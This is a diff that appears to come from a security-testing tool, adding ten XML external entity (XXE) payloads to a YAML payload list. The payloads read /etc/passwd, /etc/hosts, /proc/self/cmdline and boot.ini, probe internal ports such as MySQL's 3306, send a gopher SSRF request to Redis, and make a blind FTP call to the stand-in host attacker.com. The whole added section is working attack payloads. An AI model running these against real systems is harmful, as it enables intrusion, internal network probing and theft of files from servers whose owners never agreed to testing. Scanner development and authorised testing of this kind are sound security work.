@@ -171,6 +171,90 @@ payloads:
       </soap:Body>
     </soap:Envelope>
 
+  # --- Additional Payloads ---
+
+  # Internal Port Scan (8080)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://localhost:8080">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Internal Port Scan (3306 - MySQL)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://localhost:3306">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Access /etc/hosts
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/hosts">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Access /proc/self/cmdline (Linux)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Access C:/boot.ini (Windows - Legacy)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///c:/boot.ini">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Gopher Protocol SSRF (non-destructive - Redis PING)
+  # Updated for safety: used PING instead of FLUSHALL
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "gopher://localhost:6379/_PING%0D%0A">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Jar Protocol (Java) - File Access
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "jar:file:///tmp/test.zip!/test.txt">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Netdoc Protocol (Java) - Read arbitrary files
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Blind XXE with FTP (Updated credentials placeholder)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "ftp://USER:PASS@attacker.com:21/test">
+    ]>
+    <foo>&xxe;</foo>
+
+  # Base64 Encode Wrapper (Alternative)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+
+
 # Indicators that suggest successful XXE exploitation
 success_indicators:
   response_contains:
